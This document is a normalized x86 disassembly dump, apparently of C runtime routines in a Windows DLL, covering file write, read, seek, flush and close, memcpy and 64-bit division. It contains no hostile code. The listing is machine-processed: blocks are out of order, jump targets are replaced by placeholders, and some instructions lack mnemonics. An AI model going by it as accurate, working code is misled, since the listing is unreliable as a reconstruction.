mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_10036d27
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_10036b4b
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_1002f4a7
push 0x10
push r--data
call sub_1002ca38
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1002973e
and [ eax ] 0x0
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] edi
call sub_1002972b
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002ca7d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10036ef9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002ed74
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002f579
mov eax [ ebp - 0x1c ]
sub_1002f583
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_1002a000
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_1002f5cc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1002972b
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1002f583
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_1002ed42
pop ecx
push eax
call sub_10030be9
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_1002ed42
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_1002ed42
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_1002ed42
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1002ed42
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1002f6f7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10036e82
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1002972b
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_10029751
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_1002f76c
push 0x10
push r--data
call sub_1002ca38
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1002973e
and [ eax ] 0x0
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] edi
call sub_1002972b
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002ca7d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10036ef9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002f6f7
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002f83e
mov eax [ ebp - 0x1c ]
sub_1002f848
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_1002ed42
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
push 0x1
push ebx
push eax
call sub_1002f76c
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_1002972b
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_1002f76c
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_1002f76c
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_1002f9e5
mov edi edi
push ebp
mov ebp esp
mov eax 0x1020
call sub_10036d50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1002ed42
mov ebx eax
xor eax eax
cmp [ esi + 0x4 ] eax
pop ecx
mov [ ebp - 0x1018 ] ebx
jge r-xdata
push 0x1
push eax
push eax
push ebx
call sub_10035c5f
add esp 0x10
mov edi eax
mov [ ebp - 0x1014 ] edi
mov [ ebp - 0x1010 ] edx
test edx edx
jg r-xdata
mov [ esi + 0x4 ] eax
mov eax ebx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
and ebx 0x1f
mov [ ebp - 0x101c ] eax
mov eax [ eax ]
shl ebx 0x6
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
test [ esi + 0xc ] 0x108
mov [ ebp - 0x1005 ] cl
jne r-xdata
jl r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov edi ecx
sub edi edx
mov edx [ esi + 0xc ]
mov [ ebp - 0x100c ] edi
test dl 0x3
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x1010 ]
cdq
sub edi eax
sbb ecx edx
mov eax edi
mov edx ecx
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
test edi edi
jae r-xdata
test dl dl
js r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
mov edx [ ebp - 0x1014 ]
or edx [ ebp - 0x1010 ]
jne r-xdata
call sub_1002972b
mov [ eax ] 0x16
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
xor edx edx
cmp [ eax + 0x30 ] edx
je r-xdata
test [ esi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x100c ]
jmp r-xdata
mov edx [ esi + 0x8 ]
jmp r-xdata
shr edi 0x1
mov [ ebp - 0x1020 ] edi
cmp [ esi + 0x4 ] edx
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
cmp edx ecx
jb r-xdata
push edx
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ ebp - 0x1018 ]
call sub_10035c5f
mov esi eax
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
add eax ebx
add esp 0x10
mov edi edx
cmp esi [ eax + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
jmp r-xdata
mov eax [ ebp - 0x100c ]
xor edx edx
add eax [ ebp - 0x1014 ]
adc edx [ ebp - 0x1010 ]
shr [ ebp - 0x100c ] 0x1
sub ecx [ esi + 0x8 ]
add ecx edx
test [ eax + 0x4 ] 0x80
mov edi ecx
je r-xdata
and [ ebp - 0x100c ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
cmp edi [ eax + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_10035c5f
add esp 0x10
cmp eax [ ebp - 0x1014 ]
jne r-xdata
inc edx
inc [ ebp - 0x100c ]
push 0x0
lea ecx [ ebp - 0x100c ]
push ecx
push 0x1000
lea ecx [ ebp - 0x1004 ]
push ecx
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub [ ebp - 0x1014 ] edi
sbb [ ebp - 0x1010 ] 0x0
shr edi 0x1
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_10035c5f
add esp 0x10
test edx edx
jg r-xdata
cmp edx [ ebp - 0x1010 ]
jne r-xdata
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_10035c5f
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
jl r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov ecx [ ebp - 0x100c ]
mov ebx [ ebp - 0x1020 ]
cmp ebx ecx
ja r-xdata
jl r-xdata
mov edi [ esi + 0x18 ]
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea eax [ ebp - 0x1004 ]
test ebx ebx
je r-xdata
test eax eax
jb r-xdata
inc edi
mov edi eax
test ecx 0x400
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ esi + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
sub eax ecx
xor edx edx
add eax esi
adc edx edi
jmp r-xdata
lea edx [ ebp + ecx - 0x1004 ]
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
test [ eax + ebx + 0x4 ] 0x4
inc eax
inc edi
je r-xdata
mov cl [ eax ]
cmp cl 0xd
jne r-xdata
movzx ecx cl
movsx ecx [ ecx + rw-data ]
add eax ecx
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
dec ebx
cmp eax edx
jae r-xdata
inc eax
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax ecx
jmp r-xdata
sub_1002fd31
push 0x10
push r--data
call sub_1002ca38
push [ ebp + 0x8 ]
call sub_1002749e
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1002f9e5
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002fd71
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_1002ca7d
retn
sub_1002fd7b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
push edi
test al 0x83
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_10025558
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_1002f9e5
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1002ed42
pop ecx
push eax
call sub_10035c5f
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test al 0x8
je r-xdata
or eax 0xffffffff
xor eax eax
jmp r-xdata
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_1002fe17
push 0xc
push r--data
call sub_1002ca38
push [ ebp + 0x8 ]
call sub_1002749e
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002fd7b
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002fe5c
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
sub_1002fe66
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10024aba
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1002fe97
push 0x10
push r--data
call sub_1002ca38
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_1002972b
mov [ eax ] 0x9
call sub_1002972b
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002ca7d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10036ef9
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1002972b
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10036e82
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002ff6e
mov eax [ ebp - 0x1c ]
call sub_1002973e
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_1002ff78
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10036e82
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_10029751
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10036e82
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10036e82
push 0x1
mov edi eax
call sub_10036e82
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10036dfc
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_10030014
push 0x10
push r--data
call sub_1002ca38
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1002973e
and [ eax ] 0x0
call sub_1002972b
mov [ eax ] 0x9
call sub_1002973e
mov [ eax ] edi
call sub_1002972b
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1002ca7d
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10036ef9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1002972b
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1002ff78
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100300d7
mov eax [ ebp - 0x1c ]
sub_100300e1
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_10030168
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_10030168
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_100300e1
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_10030250
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_100302fa
push 0x10
push r--data
call sub_1002ca38
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10030390
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_100257b5
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_10024aba
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_10030399
push 0x10
push r--data
call sub_1002ca38
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100304c8
mov eax edi
call sub_1002ca7d
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_1002a000
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
